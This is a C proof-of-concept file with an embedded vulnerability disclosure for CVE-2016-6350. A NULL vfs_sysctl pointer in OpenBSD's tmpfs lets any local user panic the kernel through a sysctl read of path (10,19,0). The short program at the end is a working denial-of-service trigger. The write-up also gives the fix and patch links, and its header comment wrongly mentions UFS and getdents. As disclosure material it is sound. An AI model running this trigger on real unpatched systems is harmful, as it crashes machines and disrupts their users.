/*
 * sysctl_tmpfs_panic.c
 *    Demonstrate a panic in UFS through the getdents system call.
 *
 * gcc -g sysctl_tmpfs_panic.c -o sysctl_tmpfs_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
Any user can panic the kernel with the sysctl call.

Impact:
Any user can panic the kernel by using the sysctl call.  If a
user can manage to map a page at address zero, they may be able
to gain kernel code execution and escalate privileges (OpenBSD fortunately prevents this by default).

Description:
When processing sysctl calls, OpenBSD dispatches through a number
of intermediate helper functions.  For example, if the first integer
in the path is 10, sys_sysctl() will call through vfs_sysctl() for
further processing.  vfs_sysctl() performs a table lookup based on
the second byte, and if the byte is 19, it selects the tmpfs_vfsops
table and dispatches further processing through the vfs_sysctl method:

    if (name[0] != VFS_GENERIC) {
        for (vfsp = vfsconf; vfsp; vfsp = vfsp->vfc_next)
            if (vfsp->vfc_typenum == name[0])
                break;

        if (vfsp == NULL)
            return (EOPNOTSUPP);

        return ((*vfsp->vfc_vfsops->vfs_sysctl)(&name[1], namelen - 1,
            oldp, oldlenp, newp, newlen, p));
    }

Unfortunately, the definition for tmpfs_vfsops leaves this method NULL:

struct vfsops tmpfs_vfsops = {
    tmpfs_mount,            /* vfs_mount */
    tmpfs_start,            /* vfs_start */
    tmpfs_unmount,          /* vfs_unmount */
    tmpfs_root,         /* vfs_root */
    (void *)eopnotsupp,     /* vfs_quotactl */
    tmpfs_statfs,           /* vfs_statfs */
    tmpfs_sync,         /* vfs_sync */
    tmpfs_vget,         /* vfs_vget */
    tmpfs_fhtovp,           /* vfs_fhtovp */
    tmpfs_vptofh,           /* vfs_vptofh */
    tmpfs_init,         /* vfs_init */
    NULL,               /* vfs_sysctl */
    (void *)eopnotsupp,
};

Trying to read or write a sysctl path starting with (10,19) results
in a NULL pointer access and a panic of
"attempt to execute user address 0x0 in supervisor mode".
Since any user can perform a sysctl read, this issue can be abused
by any logged in user to panic the system.

OpenBSD intentionally prevents users from attempting to map a page
at the NULL address.  If an attacker is able to get such a mapping,
they may be able to cause the kernel to jump to code mapped at this
address (if other security protections such as SMAP/SMEP aren't in place).
This would allow an attacker to gain kernel code execution and
escalate their privileges.

Reproduction:
Run the attached sysctl_tmpfs_panic.c program. It will process
the (10,19,0) sysctl path and trigger a panic of
"attempt to execute user address 0x0 in supervisor mode".
NCC Group was able to reproduce this issue on OpenBSD 5.9 release 
running amd64.

Recommendation:
Include a NULL-pointer check in vfs_sysctl() before dispatching to
the vfs_sysctl method.  Alternately, include a vfs_sysctl method
in the tmpfs_vfsops table.

Reported: 2016-07-21
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/vfs_subr.c.diff?r1=1.248&r2=1.249
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/tmpfs/tmpfs_vfsops.c.diff?r1=1.9&r2=1.10
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/022_sysctl.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/025_sysctl.patch.sig
Assigned: CVE-2016-6350

#endif // BUG_WRITEUP ---------------------------------------------------


#include <stdio.h>
#include <sys/param.h>
#include <sys/sysctl.h>

int main(int argc, char **argv)
{
    int name[] = { 10, 19, 0 }; // vfs.tmpfs.0
    char buf[16];
    size_t sz = sizeof buf;
    int x;

    x = sysctl(name, 3, buf, &sz, 0, 0);
    if(x == -1) perror("sysctl");
    printf("no crash!\n");
    return 0;
}

